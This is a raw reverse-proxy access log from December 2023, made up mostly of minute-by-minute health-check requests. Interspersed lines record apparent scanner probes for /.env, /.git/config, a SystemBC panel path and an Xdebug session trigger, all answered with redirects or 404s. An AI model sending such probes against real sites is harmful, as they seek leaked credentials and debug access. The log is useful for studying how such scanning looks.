167.71.120.76 - - [17/Dec/2023:10:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 910 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:10:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 911 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:10:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 912 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:10:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 913 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:10:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 914 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:10:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 915 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:10:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 916 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:10:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 917 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:10:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 918 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 919 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 920 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 921 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 922 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 923 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 924 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 925 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 926 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 927 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 928 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 929 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 930 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 931 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 932 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 933 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 934 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 935 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 936 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 937 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 938 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 939 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 940 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 941 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 942 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 943 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 944 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 945 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 946 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 947 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 948 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 949 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 950 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 951 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 952 "www@docker" "http://172.18.0.9:80" 0ms
45.56.108.128 - - [17/Dec/2023:11:17:22 +0000] "GET /systembc/password.php HTTP/1.0" 404 19 "-" "-" 953 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:11:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 954 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 955 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 956 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 957 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 958 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [17/Dec/2023:11:19:37 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 959 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:11:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 960 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [17/Dec/2023:11:20:24 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 961 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:11:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 962 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 963 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 964 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 965 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 966 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 967 "www@docker" "http://172.18.0.9:80" 0ms
91.92.245.218 - - [17/Dec/2023:11:22:46 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 968 "web-to-websecure@internal" "-" 0ms
91.92.245.218 - - [17/Dec/2023:11:22:46 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 969 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:11:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 970 "www@docker" "http://172.18.0.9:80" 0ms
198.74.56.46 - - [17/Dec/2023:11:23:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 971 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:11:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 972 "www@docker" "http://172.18.0.9:80" 0ms
172.104.11.46 - - [17/Dec/2023:11:23:38 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 973 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:11:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 974 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 975 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 976 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 977 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 978 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:11:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 979 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 980 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 981 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 982 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 983 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 984 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 985 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [17/Dec/2023:11:29:46 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 986 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [17/Dec/2023:11:29:49 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 987 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:11:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 988 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 989 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 990 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:11:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 991 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 992 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 993 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 994 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 995 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 996 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 997 "www@docker" "http://172.18.0.9:80" 0ms
106.75.148.239 - - [17/Dec/2023:11:34:45 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 998 "-" "-" 0ms
106.75.148.239 - - [17/Dec/2023:11:34:45 +0000] "GET /gatew HTTP/1.1" 404 19 "-" "-" 999 "-" "-" 0ms
83.97.73.87 - - [17/Dec/2023:11:35:12 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 17 "-" "-" 1000 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [17/Dec/2023:11:35:13 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 1001 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:11:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1002 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1003 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1004 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1005 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1006 "www@docker" "http://172.18.0.9:80" 0ms
172.203.187.48 - - [17/Dec/2023:11:37:29 +0000] "GET //.env HTTP/1.1" 301 17 "-" "-" 1007 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:11:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1008 "www@docker" "http://172.18.0.9:80" 0ms
170.64.138.139 - - [17/Dec/2023:11:37:54 +0000] "GET /.git/config HTTP/1.1" 301 17 "-" "-" 1009 "web-to-websecure@internal" "-" 0ms
170.64.138.139 - - [17/Dec/2023:11:37:55 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 1010 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:11:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1011 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1012 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1013 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1014 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1015 "www@docker" "http://172.18.0.9:80" 0ms
45.79.163.53 - - [17/Dec/2023:11:40:37 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1016 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:11:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1017 "www@docker" "http://172.18.0.9:80" 0ms
45.56.108.128 - - [17/Dec/2023:11:40:53 +0000] "GET /systembc/password.php HTTP/1.0" 404 19 "-" "-" 1018 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:11:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1019 "www@docker" "http://172.18.0.9:80" 0ms
83.97.73.87 - - [17/Dec/2023:11:41:24 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 17 "-" "-" 1020 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [17/Dec/2023:11:41:25 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 1021 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:11:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1022 "www@docker" "http://172.18.0.9:80" 0ms
91.92.243.232 - - [17/Dec/2023:11:42:12 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1023 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:11:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1024 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1025 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1026 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:11:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1027 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1028 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1029 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1030 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1031 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1032 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1033 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1034 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1035 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1036 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1037 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1038 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:49:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1039 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1040 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:11:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1041 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1042 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1043 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1044 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1045 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1046 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1047 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1048 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1049 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:11:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1050 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1051 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1052 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1053 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1054 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1055 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1056 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1057 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:11:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1058 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:11:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1059 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:12:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1060 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:12:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1061 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:12:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1062 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:12:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1063 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:12:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1064 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:12:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1065 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [17/Dec/2023:12:02:55 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1066 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:12:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1067 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:12:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1068 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [17/Dec/2023:12:04:17 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1069 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:12:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1070 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:12:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1071 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:12:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1072 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:12:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1073 "www@docker" "http://172.18.0.9:80" 0ms
69.164.217.74 - - [17/Dec/2023:12:06:16 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1074 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:12:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1075 "www@docker" "http://172.18.0.9:80" 0ms
172.105.128.11 - - [17/Dec/2023:12:06:30 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1076 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:12:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1077 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:12:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1078 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:12:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1079 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:12:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1080 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:12:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1081 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:12:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1082 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:12:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1083 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:12:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1084 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:12:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1085 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:12:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1086 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:12:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1087 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:12:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1088 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:12:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1089 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:12:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1090 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:12:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1091 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:12:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1092 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:12:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1093 "www@docker" "http://172.18.0.9:80" 1ms
68.69.186.30 - - [17/Dec/2023:12:15:07 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1094 "web-to-websecure@internal" "-" 0ms
